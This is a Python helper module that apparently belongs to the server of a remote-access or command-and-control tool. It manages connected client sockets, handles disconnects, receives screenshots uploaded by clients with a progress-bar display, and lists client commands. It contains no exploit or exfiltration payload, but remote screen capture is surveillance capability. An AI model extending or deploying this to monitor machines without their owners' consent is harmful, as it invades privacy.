import os
import platform
import time
import socket
import colorama # type: ignore  
from colorama import Fore, Style # type: ignore

# Initialize colorama
colorama.init(autoreset=True)

# Import after defining our own functions to avoid circular imports
from modules.server_formatings import format_screenshot_progress, format_client_command_help
from modules.server_ui_utils import print_banner, clear_screen # type: ignore

def handle_client_disconnect(client_id, client_sockets, active_client=None):
    """Handle client disconnection"""
    if client_sockets[client_id]:
        try:
            client_sockets[client_id].close()
        except:
            pass
        client_sockets[client_id] = None
        
    print(f"{Fore.RED}Client {client_id} disconnected{Style.RESET_ALL}")
    
    # Update active client if this was the active one and active_client was provided
    if active_client is not None and active_client == client_id:
        return -1
    return active_client if active_client is not None else None

def receive_screenshot(client_socket, BUFFER_SIZE):
    """Receive screenshot data from client and save to file"""
    try:
        # First receive the file size
        size_data = client_socket.recv(8)
        file_size = int.from_bytes(size_data, byteorder='big')
        
        # Create screenshots directory if it doesn't exist
        if not os.path.exists("screenshots"):
            os.makedirs("screenshots")
        
        # Generate filename with timestamp
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"screenshots/screenshot_{timestamp}.png"
        
        # Calculate box dimensions once
        filename_display = f"Downloading screenshot to {filename}"
        box_width = max(len(filename_display) + 4, 56)
        
        # Calculate progress bar components with exact spacing
        # Fixed width for progress text to ensure consistency
        progress_text = "  0.00% " # Added an extra space at the beginning
        # Account for the exact number of characters in the box borders
        bar_length = box_width - len(progress_text) - 4  # 4 for "║ " and " ║"
        
        # Print the box with exact width
        print(f"{Fore.CYAN}╔{'═' * (box_width - 2)+'═'}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.WHITE}{filename_display}{' ' * (box_width - len(filename_display) - 3)}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{'░' * bar_length}{Style.RESET_ALL}{progress_text}{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═' * (box_width - 2)+'═'}╝{Style.RESET_ALL}")
        
        # Move cursor up to the progress bar line
        print(f"\033[2A", end="")
        
        # Receive and save the file
        bytes_received = 0
        with open(filename, "wb") as f:
            while bytes_received < file_size:
                # Receive data in chunks
                chunk_size = min(BUFFER_SIZE, file_size - bytes_received)
                chunk = client_socket.recv(chunk_size)
                
                if not chunk:
                    break
                
                f.write(chunk)
                bytes_received += len(chunk)
                
                # Update progress bar in place
                progress = (bytes_received / file_size) * 100
                # Ensure consistent width for progress text
                progress_text = f"  {progress:6.2f}% " # Added an extra space at the beginning
                filled_length = int(bar_length * progress / 100)
                # Ensure bar doesn't exceed allocated space
                filled_length = min(filled_length, bar_length)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)
                
                # Move to beginning of line and update progress bar
                # Ensure exact character count matches initial display
                print(f"\r{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{bar}{Style.RESET_ALL}{progress_text}{Fore.CYAN}║{Style.RESET_ALL}", end="")
            
            # Move cursor down past the box bottom after completion
            print("\n\n")
        
        print(f"{Fore.GREEN}Screenshot saved to {filename}{Style.RESET_ALL}")
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error receiving screenshot: {str(e)}{Style.RESET_ALL}")
        return None

def show_client_commands():
    """Show available client commands"""
    # Use the formatted client command help from server_formatings.py
    from modules.server_formatings import format_client_command_help
    formatted_help = format_client_command_help()
    print(formatted_help)




